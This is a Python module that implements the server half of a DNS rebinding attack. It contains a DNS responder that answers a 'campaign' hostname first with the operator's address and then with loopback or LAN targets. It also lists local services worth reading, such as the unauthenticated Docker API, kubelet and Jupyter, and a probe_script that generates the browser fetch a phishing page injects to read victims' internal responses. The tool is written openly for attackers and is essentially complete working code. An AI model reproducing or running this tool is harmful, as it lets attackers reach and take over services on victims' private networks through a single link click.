"""DNS rebinding: from a link click to the victim's own network.

A browser cannot read a LAN or loopback response, because the origin differs.
DNS rebinding removes that wall: the campaign hostname first resolves to OUR
server (so the page loads and its script runs), then - after the browser has
cached it for one second - the same hostname resolves to 127.0.0.1 or a LAN
address. The browser now treats `http://rebind.<domain>:2375/...` as
SAME-ORIGIN with the page, so the script can read the response: a router admin
panel, the Docker API, Jupyter, Elasticsearch, Ollama, a kubelet.

This module is the server half. It is a minimal, dependency-free DNS responder:

  * pure functions for the wire format (`parse_query`, `build_response`) so the
    protocol handling is unit-testable without a socket
  * `RebindServer` - a threaded UDP responder with a per-client policy: the
    first query from a client gets the public address, later ones get the target
  * `plan()` - what a given client will be answered with, so the operator can see
    the strategy instead of guessing

The operator supplies a domain whose NS record points at this host (a wildcard
A/NS for the campaign domain). Everything else is here.
"""
import ipaddress
import socketserver
import struct
import threading
import time

QTYPE_A = 1
QTYPE_AAAA = 28
QCLASS_IN = 1

# Common local services worth reading once rebinding works. The port is the
# interesting part; the name is what the operator sees.
LOCAL_SERVICES = {
    2375: "docker-api (unauthenticated)",
    2376: "docker-api (tls)",
    3000: "dev server / grafana",
    5000: "dev server",
    5601: "kibana",
    6443: "kubernetes api",
    7860: "gradio",
    8000: "dev server",
    8080: "admin panel / proxy",
    8081: "admin panel",
    8123: "home assistant",
    8500: "consul",
    8888: "jupyter",
    9000: "portainer / php-fpm",
    9090: "prometheus / cockpit",
    9091: "transmission",
    9200: "elasticsearch",
    10250: "kubelet",
    11434: "ollama",
    15672: "rabbitmq management",
    27017: "mongodb (http interface)",
    631: "cups (printer)",
    5900: "vnc",
}


def _encode_name(name):
    out = b""
    for label in str(name).strip(".").split("."):
        if not label:
            continue
        out += bytes([len(label)]) + label.encode("ascii", "ignore")
    return out + b"\x00"


def parse_query(data):
    """Parse a DNS query into {id, name, qtype, qclass, flags, raw_question}.

    Only what this server needs: the id, the QNAME, the QTYPE/QCLASS and the
    question bytes (so a response can echo them). Malformed input returns None
    instead of raising, because a responder must never die on a junk packet.
    """
    try:
        if len(data) < 12:
            return None
        tid, flags, qd, _an, _ns, _ar = struct.unpack("!HHHHHH", data[:12])
        if qd < 1:
            return None
        pos, labels = 12, []
        while True:
            if pos >= len(data):
                return None
            ln = data[pos]
            if ln == 0:
                pos += 1
                break
            if ln & 0xC0:                       # a pointer in a question is bogus
                return None
            labels.append(data[pos + 1:pos + 1 + ln].decode("ascii", "replace"))
            pos += 1 + ln
        if pos + 4 > len(data):
            return None
        qtype, qclass = struct.unpack("!HH", data[pos:pos + 4])
        return {"id": tid, "name": ".".join(labels).lower(), "qtype": qtype,
                "qclass": qclass, "flags": flags, "question": data[12:pos + 4]}
    except Exception:
        return None


def build_response(query, ip, ttl=1, rcode=0):
    """An authoritative A answer for `query` pointing at `ip`.

    AAAA and anything else get an empty NOERROR answer: a rebinding host that
    also advertises an IPv6 address would have the browser prefer it, which
    breaks the trick.
    """
    if query is None:
        return None
    flags = 0x8400 | (rcode & 0xF)              # QR=1, AA=1
    header = struct.pack("!HHHHHH", query["id"], flags, 1, 0, 0, 0)
    body = query["question"]
    if query["qtype"] == QTYPE_A and query["qclass"] in (QCLASS_IN, 255):
        try:
            rdata = ipaddress.IPv4Address(str(ip)).packed
        except Exception:
            rdata = None
        if rdata is not None:
            header = struct.pack("!HHHHHH", query["id"], flags, 1, 1, 0, 0)
            answer = (b"\xc0\x0c" + struct.pack("!HHIH", QTYPE_A, QCLASS_IN,
                                                int(ttl), len(rdata)) + rdata)
            return header + body + answer
    return header + body


class RebindPlan:
    """What one client is answered with, and why.

    The browser caches the first answer for `ttl` seconds, so the policy is
    query-count based rather than time based: answer 1 is the public address
    (the page must load), answers 2..n are the targets. With `ttl=1` the browser
    comes back within about a second, which is what makes the flip happen while
    the page is still open.
    """

    def __init__(self, public_ip, targets, rebind_after=1, ttl=1, rotate=True):
        self.public_ip = str(public_ip)
        self.targets = [str(t) for t in targets if t]
        if not self.targets:
            raise ValueError("rebinding needs at least one target address")
        self.rebind_after = max(1, int(rebind_after))
        self.ttl = max(1, int(ttl))
        self.rotate = bool(rotate)

    def pick(self, count):
        """The address for the `count`-th query from one client (1-based)."""
        if count <= self.rebind_after:
            return self.public_ip
        i = count - self.rebind_after - 1
        return self.targets[i % len(self.targets)] if self.rotate else self.targets[0]

    def describe(self):
        return (f"first {self.rebind_after} query/queries -> {self.public_ip} "
                f"(ttl {self.ttl}s), then -> {', '.join(self.targets)}"
                + (" (rotating)" if self.rotate and len(self.targets) > 1 else ""))


class RebindServer:
    """A threaded UDP DNS responder with the rebinding policy."""

    def __init__(self, domain, plan, port=53, host="0.0.0.0"):
        self.domain = str(domain).strip(".").lower()
        self.plan = plan
        self.port = int(port)
        self.host = host
        self.counts = {}
        self.log = []
        self.max_counters = 4096
        self.lock = threading.Lock()
        self.httpd = None
        self._thread = None

    def matches(self, name):
        """Does this query belong to the campaign hostname (or a subdomain)?"""
        n = str(name or "").strip(".").lower()
        return n == self.domain or n.endswith("." + self.domain)

    def start(self):
        outer = self

        class _UDP(socketserver.ThreadingUDPServer):
            allow_reuse_address = True
            daemon_threads = True

        class _Handler(socketserver.BaseRequestHandler):
            def handle(self):
                data, sock = self.request
                query = parse_query(data)
                if not query or not outer.matches(query["name"]):
                    return
                client = self.client_address[0]
                with outer.lock:
                    # Key on the queried NAME when it carries a per-session label
                    # (`<label>.<campaign>`), because keying on the source address
                    # means every victim behind one NAT/resolver shares a counter and
                    # only the first of them ever sees the "page must load" answer.
                    qname = str(query.get("name") or "")
                    key = qname if qname.count(".") > 1 else client
                    outer.counts[key] = outer.counts.get(key, 0) + 1
                    count = outer.counts[key]
                    if len(outer.counts) > outer.max_counters:
                        # a flood must not grow the map without bound
                        for k in list(outer.counts)[:outer.max_counters // 2]:
                            outer.counts.pop(k, None)
                ip = outer.plan.pick(count)
                resp = build_response(query, ip, ttl=outer.plan.ttl)
                if resp:
                    # log before answering: a reply the client holds must always
                    # have a matching log row (a reader raced the append before)
                    with outer.lock:
                        outer.log.append({"ts": time.time(), "client": client,
                                          "name": query["name"], "answer": ip,
                                          "count": count})
                    sock.sendto(resp, self.client_address)

        self.httpd = _UDP((self.host, self.port), _Handler)
        self._thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self._thread.start()
        return self

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None

    def describe(self):
        return (f"rebinding '{self.domain}' on {self.host}:{self.port} - "
                f"{self.plan.describe()}")

    def summary(self, limit=20):
        with self.lock:
            rows = list(self.log)[-limit:]
        return rows


def probe_script(domain, port, path="/", timeout_ms=3000):
    """The fetch a page runs once the name has rebound.

    Returned as a string so the operator can paste it into a console or a
    phishlet's js_inject: reading a LAN response is only possible because the
    browser now considers this name same-origin.
    """
    url = f"http://{domain}:{int(port)}{path}"
    return (
        f"fetch('{url}', {{mode:'cors', credentials:'include', cache:'no-store'}})"
        ".then(function(r){return r.text().then(function(t){"
        "return {status:r.status, len:t.length, head:t.slice(0,2000)};"
        "});}).then(function(o){console.log(o);}).catch(function(e){"
        "console.log('blocked:', e.name);});")
